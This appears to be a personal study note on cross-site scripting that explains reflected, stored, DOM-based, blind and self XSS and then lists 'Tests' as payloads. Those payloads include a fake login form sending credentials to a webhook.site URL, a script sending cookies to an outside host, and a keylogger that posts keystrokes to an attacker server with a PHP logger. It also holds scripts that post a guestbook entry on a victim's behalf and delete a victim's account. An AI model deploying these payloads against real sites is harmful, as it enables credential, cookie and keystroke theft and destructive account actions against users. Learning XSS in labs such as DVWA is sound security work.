# XSS

Client side attack where the website renders unsanitized input and can be used to instruct the browser to execute JS.

If we alert document.domain from a sandboxed iFrame, it is harmless as we can't access any information from the DOM. This is due to Same Origin Policy ( SOP ) in browsers. This restricts the way the Documents are allowed to interact with resources from different origin.

SOP example - `http://www.test.com` is the domain and if `https://www.test.com` is used it is denied due to different protocol.

In terms of testing for XSS, it’s important to realize there are really two main types of
XSS: reflected and stored.

*Reflected/non-persistent* XSS occurs when the XSS payload is delivered and executed via a single HTTP request and is not stored anywhere on the site. Since it’s not stored, it’s not possible to execute the payload without sending another HTTP request
with the payload. However, browsers (Chrome, Internet Explorer, Edge and Safari) have attempted to prevent this type of vulnerability by introducing XSS Auditors. This is built in functionality browsers have which attempt to protect users from malicious links which execute JavaScript. When this occurs, the browser will typically show a broken page with
a message stating the page has been blocked to protect users.

In contrast, *stored*/*persistent* XSS occurs when a site saves a malicious payload and renders it unsanitized. When looking for stored XSS, it’s important to note that sites may render the inputted payload in various locations. It’s possible that the payload may not execute immediately after submitting it but might execute when another page is accessed. For
example, if you created a profile on a website with an XSS payload as your name, the XSS may not execute when you view your profile but might when someone searched for your name or someone sent you a message.

*Further subtypes*
1. DOM Based - Manipulating websites existing JS code to execute. Can be Stored or Reflected.
Example  - Here the web page takes input via the URL (http://www.test.com/Hi#name) so the script finds the name in the span tag and adds it to after the location.hash (which is browser api for URL).
```
<html>
 <body>
  <h1>Hi <span id="name"></span></h1>
  <script>
   document.getElementById('name').innerHTML=location.hash.split('#')[1]
  </script>
 </body>
</html>

```
Now the page doesn't sanitize the # value in the page before updating the span element. if we had a user click on http://www.test.com/Hi#<img src=x onerror=alert(document.domain)> then the alert box would pop up.
The rendered HTML would look like this
```
<html>
 <body>
  <h1>Hi <span id="name"><img src=x onerror=alert(document.domain)></span></h1>
  <script>
   document.getElementById('name').innerHTML=location.hash.split(‘#’)[1]
  </script>
 </body>
</html>
```


2. Blind - This type of XSS is where the hacker can't access when the JS is rendered. Example would be creating a profile with malicious input and normal viewers will not trigger the XSS but an administrator view of it might. XSS hunter is a great tool.

https://xsshunter.com/

3. Self - This type of XSS may or may not be stored but only impacts the user entering the payload.
Example - If XSS is submitted via a POST request but the request is protected by CSRF protection then the attacker can only attack themselves and not anyone else.

It's best to combine this with a login/logout CSRF -  https://whitton.io/articles/uber-turning-self-xss-into-good-xss/


### Event Handlers

-onmouseover
-onclick
-onload
-onerror

Resources -

http://html5sec.org/
https://blog.innerht.ml/  
https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt


## Tests
1. Create fake login form via form tags and use webhook.site for response to phish credentials

<form action=https://webhook.site/238ea68b-e778-4445-9cc7-85360f235cae>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

2. Load image from source (webhook site) and send cookies

<script>new  Image().src="https://webhook.site/083f7f12-8502-44fc-b889-2ef793c77b18"+document.cookie;</script>

3. If httpOnly cookie is set we can't use JS or python to access the cookies however we can perform unauthorized activities

Here we are posting on victim's behalf
`'
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
	xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
</script>
'`
4. Capture keystrokes

This requires 2 pieces - (stored on attacker server) 1 keylogger.js and one key.php file which look like this

###keylogger.js
`'
document.onkeypress = function (evt) {
  evt = evt || window.event
  key = String.fromCharCode(evt.charCode)
  if(key) {
    var http = new XMLHttpRequest();
    var param = encodeURI(key)
    http.open("POST","http://xx.xx.xx.xx/key.php", true)
    http.setRequestHeader("Content-Type". "application/x-form-urlencoded");
    http.send("key="+param);
  }
}
`'
###key.php
`'
<?php
if(!empty($_POST['key'])) {
  $logfile = fopen('data.txt', 'a+');
  fwrite($logfile, $_POST['key']);
  fclose($logfile);
}
?>
`'

5. XSS CSRF
`'
<script>

var uid = document.forms[0].elements[0].value; //Traversing HTML for values
var token = document.forms[0].elements[1].value;

var req = new XMLHttpRequest();

req.open("POST", "/webapp/csrf/xss/delete", true);

req.setRequestHeader("Content-type", "x-www-form-urlencoded");

req.send("uid="+uid+ "&csrf_token="+token);

</script>
`'
If a logged in user runs a link with this XSS in the URL we will be able to delete the account.
